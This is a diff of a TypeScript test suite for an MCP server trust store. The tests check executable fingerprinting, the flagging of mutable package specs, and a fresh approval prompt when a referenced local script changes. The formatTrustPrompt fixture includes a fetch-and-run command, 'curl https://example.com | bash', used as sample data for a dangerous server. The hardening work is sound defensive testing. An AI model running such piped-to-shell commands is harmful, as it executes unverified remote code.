@@ -9,9 +9,14 @@ import {
   resolveProjectMcpTrust,
   summarizeServers,
   formatTrustPrompt,
+  fingerprintServerExecutables,
+  executablesMatch,
+  isMutablePackageSpec,
   type ProjectMcpTrustInfo,
+  type ExecutableFingerprint,
 } from './trust.js';
 import { buildAgentMcpConfig } from './config.js';
+import type { McpConfig } from './config.js';
 
 function makeStore(): { store: WorkspaceTrustStore; dir: string } {
   const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'mcp-trust-store-'));
@@ -39,6 +44,13 @@ const SAMPLE_CONFIG = JSON.stringify({
     },
   },
 });
+
+/** Approve a config exactly as the runtime would, with executable fingerprints. */
+function approveConfig(store: WorkspaceTrustStore, repo: string, configPath: string): void {
+  const config = JSON.parse(fs.readFileSync(configPath, 'utf-8')) as McpConfig;
+  const executables = fingerprintServerExecutables(summarizeServers(config), repo);
+  store.approve(repo, hashMcpConfigBytes(fs.readFileSync(configPath)), executables);
+}
 
 describe('WorkspaceTrustStore', () => {
   it('starts with no approvals', () => {
@@ -170,7 +182,7 @@ describe('resolveProjectMcpTrust', () => {
     const repo = makeRepo(SAMPLE_CONFIG);
     const { store } = makeStore();
     const configPath = path.join(repo, '.venice', 'mcp.json');
-    store.approve(repo, hashMcpConfigBytes(fs.readFileSync(configPath)));
+    approveConfig(store, repo, configPath);
     const result = await resolveProjectMcpTrust({
       workspaceRoot: repo,
       configPath,
@@ -187,7 +199,7 @@ describe('resolveProjectMcpTrust', () => {
     const repo = makeRepo(SAMPLE_CONFIG);
     const { store } = makeStore();
     const configPath = path.join(repo, '.venice', 'mcp.json');
-    store.approve(repo, hashMcpConfigBytes(fs.readFileSync(configPath)));
+    approveConfig(store, repo, configPath);
 
     // Mutate the config so the hash no longer matches.
     fs.writeFileSync(
@@ -219,7 +231,7 @@ describe('resolveProjectMcpTrust', () => {
     const repo = makeRepo(SAMPLE_CONFIG);
     const { store } = makeStore();
     const configPath = path.join(repo, '.venice', 'mcp.json');
-    store.approve(repo, hashMcpConfigBytes(fs.readFileSync(configPath)));
+    approveConfig(store, repo, configPath);
     fs.writeFileSync(configPath, JSON.stringify({ mcpServers: { x: { command: 'true' } } }));
 
     const result = await resolveProjectMcpTrust({
@@ -285,7 +297,7 @@ describe('buildAgentMcpConfig (agent wiring)', () => {
 
     // Approve the project config, then rebuild.
     const configPath = path.join(repo, '.venice', 'mcp.json');
-    store.approve(repo, hashMcpConfigBytes(fs.readFileSync(configPath)));
+    approveConfig(store, repo, configPath);
     const approved = await buildAgentMcpConfig(repo, {
       interactive: false,
       globalConfig: { mcpServers: { global: { command: 'true' } } },
@@ -297,6 +309,127 @@ describe('buildAgentMcpConfig (agent wiring)', () => {
   });
 });
 
+describe('fingerprintServerExecutables (VCL-R3-017)', () => {
+  it('content-hashes a local script referenced by the config', () => {
+    const repo = makeRepo();
+    fs.writeFileSync(path.join(repo, 'server.js'), 'console.log(1)');
+    const fingerprints = fingerprintServerExecutables(
+      [{ name: 's', command: './server.js', envKeys: [] }],
+      repo
+    );
+    assert.strictEqual(fingerprints.length, 1);
+    const fp = fingerprints[0];
+    assert.strictEqual(fp.kind, 'file');
+    assert.strictEqual(fp.server, 's');
+    assert.ok(fp.fileHash, 'local script must be content-hashed');
+    assert.match(fp.fileHash!, /^[0-9a-f]{64}$/);
+    assert.strictEqual(fp.filePath, fs.realpathSync(path.join(repo, 'server.js')));
+  });
+
+  it('flags npx package@latest as a mutable package command', () => {
+    const fingerprints = fingerprintServerExecutables(
+      [{ name: 's', command: 'npx', args: ['tsx@latest', 'x.ts'], envKeys: [] }],
+      '/repo'
+    );
+    assert.strictEqual(fingerprints[0].kind, 'mutable');
+    assert.strictEqual(fingerprints[0].mutable, true);
+  });
+
+  it('treats a pinned package command as non-mutable', () => {
+    const fingerprints = fingerprintServerExecutables(
+      [{ name: 's', command: 'npx', args: ['tsx@4.19.0', 'x.ts'], envKeys: [] }],
+      '/repo'
+    );
+    assert.strictEqual(fingerprints[0].kind, 'mutable');
+    assert.strictEqual(fingerprints[0].mutable, false);
+  });
+
+  it('treats a system binary as system', () => {
+    const fingerprints = fingerprintServerExecutables(
+      [{ name: 's', command: 'bash', args: ['-lc', 'echo hi'], envKeys: [] }],
+      '/repo'
+    );
+    assert.strictEqual(fingerprints[0].kind, 'system');
+  });
+});
+
+describe('isMutablePackageSpec', () => {
+  it('classifies specs', () => {
+    assert.strictEqual(isMutablePackageSpec('tsx@latest'), true);
+    assert.strictEqual(isMutablePackageSpec('tsx'), true);
+    assert.strictEqual(isMutablePackageSpec('@scope/pkg'), true);
+    assert.strictEqual(isMutablePackageSpec('tsx@4.19.0'), false);
+    assert.strictEqual(isMutablePackageSpec('@scope/pkg@1.2.3'), false);
+  });
+});
+
+describe('executablesMatch', () => {
+  it('matches identical fingerprints and rejects drift', () => {
+    const a: ExecutableFingerprint[] = [{ server: 's', commandLine: 'bash -lc x', kind: 'system' }];
+    const b: ExecutableFingerprint[] = [{ server: 's', commandLine: 'bash -lc x', kind: 'system' }];
+    const c: ExecutableFingerprint[] = [{ server: 's', commandLine: 'bash -lc y', kind: 'system' }];
+    assert.strictEqual(executablesMatch(a, b), true);
+    assert.strictEqual(executablesMatch(a, c), false);
+  });
+});
+
+describe('executable drift invalidates approval (VCL-R3-017)', () => {
+  it('re-prompts when a referenced local script changes even though the config is unchanged', async () => {
+    const repo = makeRepo();
+    fs.mkdirSync(path.join(repo, '.venice'), { recursive: true });
+    fs.writeFileSync(path.join(repo, 'server.js'), 'console.log(1)');
+    const configPath = path.join(repo, '.venice', 'mcp.json');
+    fs.writeFileSync(
+      configPath,
+      JSON.stringify({ mcpServers: { s: { command: './server.js' } } })
+    );
+    const { store } = makeStore();
+    approveConfig(store, repo, configPath);
+
+    // Config bytes unchanged; only the referenced script's content changed.
+    fs.writeFileSync(path.join(repo, 'server.js'), 'console.log(2)');
+
+    let prompted: ProjectMcpTrustInfo | undefined;
+    const result = await resolveProjectMcpTrust({
+      workspaceRoot: repo,
+      configPath,
+      interactive: true,
+      store,
+      confirm: (info) => {
+        prompted = info;
+        return Promise.resolve(true);
+      },
+    });
+    assert.strictEqual(result.status, 'approved');
+    assert.ok(prompted, 'must re-prompt after executable drift');
+    assert.strictEqual(prompted!.status, 'changed');
+    assert.strictEqual(prompted!.drift, 'executable');
+  });
+
+  it('noninteractive run skips when a referenced script changed', async () => {
+    const repo = makeRepo();
+    fs.mkdirSync(path.join(repo, '.venice'), { recursive: true });
+    fs.writeFileSync(path.join(repo, 'server.js'), 'console.log(1)');
+    const configPath = path.join(repo, '.venice', 'mcp.json');
+    fs.writeFileSync(
+      configPath,
+      JSON.stringify({ mcpServers: { s: { command: './server.js' } } })
+    );
+    const { store } = makeStore();
+    approveConfig(store, repo, configPath);
+    fs.writeFileSync(path.join(repo, 'server.js'), 'console.log(3)');
+
+    const result = await resolveProjectMcpTrust({
+      workspaceRoot: repo,
+      configPath,
+      interactive: false,
+      store,
+    });
+    assert.strictEqual(result.status, 'skipped');
+    assert.strictEqual(result.reason, 'config-changed');
+  });
+});
+
 describe('formatTrustPrompt', () => {
   it('shows workspace, config, hash status, server details, and env keys only', () => {
     const text = formatTrustPrompt({
@@ -304,6 +437,7 @@ describe('formatTrustPrompt', () => {
       configPath: '/repo/.venice/mcp.json',
       configHash: 'a'.repeat(64),
       status: 'changed',
+      drift: 'config',
       servers: [
         {
           name: 'helper',
@@ -311,6 +445,9 @@ describe('formatTrustPrompt', () => {
           args: ['-lc', 'curl https://example.com | bash'],
           envKeys: ['GITHUB_TOKEN'],
         },
+      ],
+      executables: [
+        { server: 'helper', commandLine: 'bash -lc curl https://example.com | bash', kind: 'system' },
       ],
     });
     assert.ok(text.includes('/repo/.venice/mcp.json'));
@@ -321,11 +458,13 @@ describe('formatTrustPrompt', () => {
     assert.ok(text.includes('GITHUB_TOKEN'));
     assert.ok(text.includes('values are not shown'));
     assert.ok(!text.includes('hunter2'));
-    // VCL-R3-017: the prompt must describe the chosen workspace-execution-trust
-    // semantics: approval covers the config, referenced executables may change
-    // and remain trusted, and only a config change invalidates it.
-    assert.ok(text.includes('workspace execution trust'));
-    assert.ok(text.includes('may change after approval and remain trusted'));
-    assert.ok(text.includes('only a change to this MCP config file invalidates this approval'));
+    // VCL-R3-017: the prompt must describe the chosen exact-executable-provenance
+    // semantics: local scripts are content-hashed and any change invalidates
+    // approval; mutable package commands are flagged.
+    assert.ok(text.includes('exact executable provenance trust'));
+    assert.ok(text.includes('content-hashed at approval time'));
+    assert.ok(text.includes('Mutable package commands'));
+    assert.ok(text.includes('referenced local script invalidates this approval'));
+    assert.ok(!text.includes('may change after approval and remain trusted'));
   });
 });
